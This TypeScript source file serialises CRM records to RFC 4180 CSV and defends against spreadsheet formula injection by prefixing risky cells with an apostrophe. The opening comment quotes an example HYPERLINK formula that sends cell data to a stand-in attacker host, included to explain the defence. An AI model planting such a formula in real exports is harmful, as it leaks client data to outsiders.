/**
 * RFC 4180 CSV serialisation with spreadsheet formula-injection defence.
 *
 * Exports are the one place CRM data leaves the system and gets opened in a program
 * that executes its contents. Excel, LibreOffice and Google Sheets all evaluate a cell
 * beginning with `=`, `+`, `-` or `@` as a formula, so a contact whose name is
 * `=HYPERLINK("http://attacker/"&A1,"click")` turns the client's own export into an
 * exfiltration vector. Neutralising that is not optional.
 */

/**
 * UTF-8 byte order mark.
 *
 * Excel on Windows reads a BOM-less file as the system codepage, which mangles any
 * name containing an accent. Prepended by the export route, kept separate so the CSV
 * body itself stays pure.
 */
export const CSV_BOM = '﻿'

/**
 * Characters that make a spreadsheet treat the cell as a formula.
 *
 * Checked against the whitespace-trimmed value, because spreadsheets trim before
 * deciding.
 */
const FORMULA_CHARS = ['=', '+', '-', '@']

/**
 * Control characters that are dangerous in the leading position.
 *
 * Checked against the *raw* value: `trimStart()` counts tab and carriage return as
 * whitespace and would strip them, so testing these against a trimmed string silently
 * misses `\tcmd` and `\rcmd`.
 */
const DANGEROUS_CONTROL_PREFIXES = ['\t', '\r']

/** Characters that force RFC 4180 quoting. */
const MUST_QUOTE = /[",\r\n]/

export type CsvColumn = {
  key: string
  header: string
}

/**
 * Serialises one value into a CSV field.
 *
 * Order matters: the formula guard is applied *before* quoting. Prefixing after
 * quoting would place the apostrophe outside the quotes, where the spreadsheet
 * ignores it and evaluates the payload anyway.
 */
export function escapeCsvValue(value: unknown): string {
  if (value === null || value === undefined) {
    return ''
  }

  let text = String(value)

  // Spreadsheets trim leading whitespace before deciding whether a cell is a
  // formula, so `  =1+1` is still dangerous.
  const isFormula = FORMULA_CHARS.some((prefix) => text.trimStart().startsWith(prefix))
  const hasControlPrefix = DANGEROUS_CONTROL_PREFIXES.some((prefix) => text.startsWith(prefix))

  if (isFormula || hasControlPrefix) {
    text = `'${text}`
  }

  if (MUST_QUOTE.test(text)) {
    return `"${text.replaceAll('"', '""')}"`
  }

  return text
}

/**
 * Serialises rows into an RFC 4180 document.
 *
 * Only the requested columns are emitted, in the order given — the row objects come
 * straight from the database, so an explicit column list keeps unrelated fields out
 * of an export.
 */
export function toCsv(rows: Record<string, unknown>[], columns: CsvColumn[]): string {
  const headerLine = columns.map((column) => escapeCsvValue(column.header)).join(',')

  const dataLines = rows.map((row) =>
    columns.map((column) => escapeCsvValue(row[column.key])).join(',')
  )

  // RFC 4180 specifies CRLF.
  return [headerLine, ...dataLines].join('\r\n')
}
